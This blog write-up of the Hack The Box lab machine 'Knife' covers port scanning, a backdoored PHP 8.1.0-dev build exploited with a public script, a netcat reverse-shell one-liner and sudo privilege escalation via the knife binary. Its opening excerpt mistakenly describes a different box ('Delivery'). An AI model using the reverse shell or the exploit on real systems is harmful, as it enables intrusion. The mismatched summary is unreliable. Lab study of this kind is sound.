---
layout: single
title: Knife - Hack The Box
excerpt: "Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell."
date: 23-12-2023
classes: wide
header:
  teaser: /assets/images/htb-writeup-knife/knife_logo.jpg
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - PHP
  - Web
  - RCE
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-knife/knife_logo.jpg)


Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.


## Portscan

The scan show that we have port 22 and port 80 open with an apache  web server 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-23 19:04 EST
Nmap scan report for 10.10.10.242
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.23 seconds

                                                        
```

## Website

I found using wappalyzer that the website is using PHP version 8.1.0

![](../assets/images/htb-writeup-knife/web-wappalyzer.png)

I re-checked the headers with burpsuite and discovered that the page was using this specific version PHP 8.1.0-dev. 

![](../assets/images/htb-writeup-knife/web-burpsuite.png)


Doing some research we know that this PHP version was released with a backdoor. This version let you execute code by sending the User-Agentt header. 

![](../assets/images/htb-writeup-knife/web-google.png)

![](../assets/images/htb-writeup-knife/web-exploit-db.png)

## Exploit

Using the script i´ve found in exploitdb i´ve got an non stable shell in the server. 

```
bash
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ ls    
bin
boot
cdrom
dev
etc
home
lib
lib32
lib64
libx32
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
sys
tmp
usr
var
```

To get an interactive shell i set up a listener in my machine running on port 4444 and used a reverse shell comand in the server. 

#### Remote shell execution 
```
bash
└─$ python 49933.py
Enter the full host url:
http://10.10.10.242/

Interactive shell is opened on http://10.10.10.242/ 
Can't acces tty; job crontol turned off.
$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.71 4443 >/tmp/f


<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>504 Gateway Timeout</title>
</head><body>
<h1>Gateway Timeout</h1>
<p>The gateway did not receive a timely response
from the upstream server or application.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 10.10.10.242 Port 80</address>
</body></html>
``

#### Listener and user flag
```
└─$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [10.10.14.71] from (UNKNOWN) [10.10.10.242] 38728
bash: cannot set terminal process group (1018): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ cd /home/james
```
![](../assets/images/htb-writeup-knife/web-user-txt.png)


## Privilege Escalation

A common way to get privileges in a machine is by searching SUID binaries, which can be executed with the privileges of an owner or group, this can help us to get a privileged shell. 
```
bash
james@knife:/$ sudo -l     
sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Ive look for the knife binary that we can run it as root and found that can help us to get the root shell.

![](../assets/images/htb-writeup-knife/web-gtfobins.png)

And we have the root flag 

![](../assets/images/htb-writeup-knife/web-root-txt.png)